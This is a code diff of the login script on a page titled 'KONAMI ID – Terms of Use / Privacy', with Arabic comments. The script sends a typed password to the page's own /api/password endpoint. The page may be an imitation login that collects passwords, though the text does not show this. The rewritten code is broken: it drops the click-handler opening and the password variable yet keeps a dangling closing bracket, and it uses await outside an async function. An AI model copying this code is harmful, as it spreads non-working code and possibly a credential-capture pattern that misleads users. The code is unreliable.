@@ -404,29 +404,28 @@ KONAMI ID – Terms of Use / Privacy
 
 
 <script>
-const demoLogin = document.getElementById('demoLogin');
-const passwordInput = document.getElementById('password');
+try {
+  const r = await fetch('/api/password', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ password })
+  });
 
-demoLogin.addEventListener('click', async (e) => {
-    e.preventDefault();
+  const text = await r.text();          // اقرأ كنص أولاً
+  let d = {};
+  try { d = JSON.parse(text); } catch (e) {}
 
-    const password = passwordInput.value.trim().replace(/\s+/g, ' ');
+  if (!r.ok) {
+    alert('خطأ ' + r.status + ': ' + (d.error || text.slice(0, 100)));
+    return;
+  }
 
-    try {
-        const r = await fetch('/api/password', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ password })
-        });
+  // نجح الإرسال: ضع هنا ما تريده (الانتقال للخطوة التالية مثلاً)
+  alert('✅ تم');
 
-        const d = await r.json();
-
-
-    } catch (err) {
-        alert('حدث خطأ أثناء الاتصال بالخادم');
-    }
+} catch (err) {
+  alert('تعذّر الاتصال: ' + err.message);
+}
 });
 // PAGE ELEMENTS
 
